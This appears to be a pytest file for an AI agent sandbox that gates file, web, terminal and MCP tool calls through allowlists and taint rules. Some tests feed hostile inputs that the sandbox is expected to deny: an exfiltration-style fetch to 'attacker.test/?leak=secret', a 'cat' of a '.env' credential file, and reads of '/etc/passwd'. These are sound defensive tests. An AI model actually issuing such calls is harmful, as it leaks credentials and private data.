"""Tests for the leaf capability sandbox (Fase 8 §8.3)."""

import json
from pathlib import Path

from lohra.workflow.sandbox import (
    WorkflowPolicy,
    load_policy,
    make_sandboxed_leaf_factory,
    sandbox_dispatch,
)


def _base(name, args):
    return '{"ok": true, "ran": true}'  # the underlying dispatch "runs" the tool


def _denied(out: str) -> bool:
    return "error" in json.loads(out)


def test_fs_read_inside_working_root_allowed(tmp_path):
    target = tmp_path / "work" / "note.txt"
    target.parent.mkdir(parents=True)
    target.write_text("x")
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert not _denied(d("read_file", {"path": str(target)}))


def test_fs_read_outside_working_root_denied(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(tmp_path / "elsewhere.txt")}))


def test_fs_write_append_mode_gated_same_as_overwrite(tmp_path):
    # issue #67: write_file's mode="append" is just another argument to the
    # SAME tool name — the sandbox gates on (tool name, path), never on the
    # write's own args, so the write-scope check and its refusal text are
    # identical for append and overwrite. Pinned here so a future change to
    # `_fs_denial` can't special-case `mode` without this test noticing.
    work = tmp_path / "work"
    d = sandbox_dispatch(_base, working_root=work, policy=WorkflowPolicy(), tainted=False)
    inside = d("write_file", {"path": str(work / "shared.txt"), "content": "x", "mode": "append"})
    outside = d(
        "write_file",
        {"path": str(tmp_path / "elsewhere.txt"), "content": "x", "mode": "append"},
    )
    overwrite_outside = d(
        "write_file", {"path": str(tmp_path / "elsewhere.txt"), "content": "x"}
    )
    assert not _denied(inside)
    assert _denied(outside)
    assert json.loads(outside)["error"] == json.loads(overwrite_outside)["error"]


def test_fs_read_of_lohra_config_denied(tmp_path):
    # ~/.lohra/.env is outside the run's working_root -> deny-by-default.
    d = sandbox_dispatch(_base, working_root=tmp_path / "work", policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("read_file", {"path": str(Path.home() / ".lohra" / ".env")}))


def test_web_fetch_non_allowlisted_host_denied(tmp_path):
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert _denied(d("web_fetch", {"url": "https://attacker.test/?leak=secret"}))
    assert not _denied(d("web_fetch", {"url": "https://good.test/page"}))


def test_egress_default_deny_when_no_allowlist(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    assert _denied(d("web_fetch", {"url": "https://anything.test/"}))


def test_tainted_run_denies_all_fs_and_egress(tmp_path):
    work = tmp_path / "work"
    work.mkdir()
    f = work / "ok.txt"
    f.write_text("x")
    policy = WorkflowPolicy(egress_allow=("good.test",))
    d = sandbox_dispatch(_base, working_root=work, policy=policy, tainted=True)
    assert _denied(d("read_file", {"path": str(f)}))  # even inside working_root
    assert _denied(d("web_fetch", {"url": "https://good.test/"}))  # even allowlisted
    assert _denied(d("web_search", {"query": "x"}))


def test_tool_outside_the_gated_classes_still_passes_through(tmp_path):
    # NAMED residual (issue #4): the sandbox gates fs, egress, `terminal` and
    # `mcp_*`. A name outside those four classes is NOT gated here — it is
    # already narrowed by `_CHILD_EXCLUDED_TOOLS` in subagent_dispatch, which
    # runs underneath. Gating unknown names by default would silently break any
    # ordinary stateless tool added to the registry later.
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=True)
    assert not _denied(d("some_other_tool", {"x": 1}))


# --- terminal: deny-by-default, operator opt-in only (issue #4 / F01-A) ---


def test_terminal_denied_by_default(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    out = d("terminal", {"command": "cat ~/.lohra/.env"})
    assert _denied(out)
    assert "allow_terminal" in out and "LOHRA_LEAF_ALLOW_TERMINAL" in out  # names the remedy


def test_terminal_allowed_when_the_operator_opts_in(tmp_path):
    policy = WorkflowPolicy(allow_terminal=True)
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("terminal", {"command": "ls"}))


def test_tainted_run_denies_terminal_even_with_opt_in(tmp_path):
    policy = WorkflowPolicy(allow_terminal=True)
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=True)
    out = d("terminal", {"command": "ls"})
    assert _denied(out)
    assert "allow_terminal" not in out  # no remedy: taint has no override


# --- mcp_*: deny-by-default, per-server operator allowlist ---


def test_mcp_tool_denied_by_default(tmp_path):
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=WorkflowPolicy(), tainted=False)
    out = d("mcp_srv_query", {})
    assert _denied(out)
    assert "mcp_allow" in out and "LOHRA_LEAF_MCP_ALLOW" in out


def test_mcp_allowlist_is_per_server(tmp_path):
    policy = WorkflowPolicy(mcp_allow=("srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("mcp_srv_query", {}))
    assert _denied(d("mcp_other_query", {}))  # another server stays denied
    assert _denied(d("mcp_srvx_query", {}))  # NOT a loose prefix match


def test_mcp_server_name_with_underscores_and_dashes(tmp_path):
    # `mcp_tool_name` slugs the server (lowercase, non-alnum -> "_"), so the
    # operator may write the server as configured; the policy slugs it the same.
    policy = WorkflowPolicy(mcp_allow=("My-Srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=False)
    assert not _denied(d("mcp_my_srv_query", {}))


def test_tainted_run_denies_an_allowlisted_mcp_tool(tmp_path):
    policy = WorkflowPolicy(mcp_allow=("srv",))
    d = sandbox_dispatch(_base, working_root=tmp_path, policy=policy, tainted=True)
    assert _denied(d("mcp_srv_query", {}))


# --- the operator surfaces: policy file + env ---


def test_load_policy_reads_terminal_and_mcp_keys(tmp_path):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"allow_terminal": True, "mcp_allow": ["srv", "  ", 7, "Other"]}))
    policy = load_policy(p)
    assert policy.allow_terminal is True
    assert policy.mcp_allow == ("srv", "other")  # slugged; junk dropped


def test_load_policy_rejects_non_bool_allow_terminal(tmp_path):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"allow_terminal": "false"}))  # truthy string -> dropped
    assert load_policy(p).allow_terminal is False


def test_env_can_opt_terminal_in_without_a_policy_file(tmp_path, monkeypatch):
    monkeypatch.setenv("LOHRA_LEAF_ALLOW_TERMINAL", "1")
    assert load_policy(tmp_path / "nope.json").allow_terminal is True


def test_env_garbage_is_ignored_and_stays_denied(tmp_path, monkeypatch):
    monkeypatch.setenv("LOHRA_LEAF_ALLOW_TERMINAL", "maybe")
    assert load_policy(tmp_path / "nope.json").allow_terminal is False


def test_env_mcp_allowlist_merges_with_the_file(tmp_path, monkeypatch):
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"mcp_allow": ["srv"]}))
    monkeypatch.setenv("LOHRA_LEAF_MCP_ALLOW", "other, third ,")
    assert load_policy(p).mcp_allow == ("srv", "other", "third")


def test_default_policy_is_deny_for_terminal_and_mcp():
    policy = WorkflowPolicy()
    assert policy.allow_terminal is False and policy.mcp_allow == ()


def test_load_policy_missing_file_is_default_deny(tmp_path):
    policy = load_policy(tmp_path / "nope.json")
    assert policy.fs_allow == () and policy.egress_allow == ()


def test_load_policy_reads_allowlists(tmp_path):
    # A bare string root is READ-WRITE (WF-21 back-compat: that is what every
    # policy written before the mode existed already granted). The ro/rw split
    # itself lives in tests/test_workflow_m7_fixes.py.
    p = tmp_path / "policy.json"
    p.write_text(json.dumps({"fs_allow": ["/data"], "egress_allow": ["api.test"]}))
    policy = load_policy(p)
    assert policy.egress_allow == ("api.test",)
    assert [(str(root.path), root.writable) for root in policy.fs_allow] == [("/data", True)]


def test_sandboxed_factory_wraps_dispatch():
    class FakeAgent:
        tool_dispatch = staticmethod(_base)

    factory = make_sandboxed_leaf_factory(
        base_factory=lambda: FakeAgent(),
        working_root=Path("/tmp/work"),
        policy=WorkflowPolicy(),
        tainted=False,
    )
    agent = factory()
    assert _denied(agent.tool_dispatch("read_file", {"path": "/etc/passwd"}))


# --- the leaf must not even SEE what the dispatch would deny (defense in depth) ---


def _defs(*names):
    return tuple({"type": "function", "function": {"name": n}} for n in names)


def _leaf_tools(policy, tainted, names=("read_file", "terminal", "mcp_srv_query", "web_fetch")):
    class FakeAgent:
        tool_dispatch = staticmethod(_base)
        tool_definitions = _defs(*names)

    factory = make_sandboxed_leaf_factory(
        base_factory=lambda: FakeAgent(),
        working_root=Path("/tmp/work"),
        policy=policy,
        tainted=tainted,
    )
    agent = factory()
    return [d["function"]["name"] for d in agent.tool_definitions]


def test_leaf_definitions_drop_terminal_and_mcp_by_default():
    # Seeing a tool it can only be refused for burns iterations off the leaf's
    # 50-cap; delegate.py already strips-and-refuses on BOTH surfaces.
    names = _leaf_tools(WorkflowPolicy(), False)
    assert "terminal" not in names and "mcp_srv_query" not in names
    assert names == ["read_file", "web_fetch"]  # ungated tools untouched


def test_leaf_definitions_keep_what_the_operator_opted_into():
    policy = WorkflowPolicy(allow_terminal=True, mcp_allow=("srv",))
    names = _leaf_tools(policy, False)
    assert "terminal" in names and "mcp_srv_query" in names


def test_leaf_definitions_drop_a_non_allowlisted_mcp_server():
    names = _leaf_tools(WorkflowPolicy(mcp_allow=("other",)), False)
    assert "mcp_srv_query" not in names


def test_leaf_definitions_never_carry_terminal_or_mcp_under_taint():
    policy = WorkflowPolicy(allow_terminal=True, mcp_allow=("srv",))
    names = _leaf_tools(policy, True)
    assert "terminal" not in names and "mcp_srv_query" not in names


def test_sandboxed_factory_tolerates_an_agent_without_definitions():
    class FakeAgent:
        tool_dispatch = staticmethod(_base)

    factory = make_sandboxed_leaf_factory(
        base_factory=lambda: FakeAgent(),
        working_root=Path("/tmp/work"),
        policy=WorkflowPolicy(),
        tainted=False,
    )
    assert _denied(factory().tool_dispatch("terminal", {"command": "ls"}))


def test_env_false_values_are_silent_and_deny(tmp_path, monkeypatch, caplog):
    # An operator writing the OFF value explicitly is not making a mistake.
    for value in ("0", "false", "off", "no", "FALSE"):
        monkeypatch.setenv("LOHRA_LEAF_ALLOW_TERMINAL", value)
        with caplog.at_level("WARNING"):
            caplog.clear()
            assert load_policy(tmp_path / "nope.json").allow_terminal is False
        assert caplog.records == []
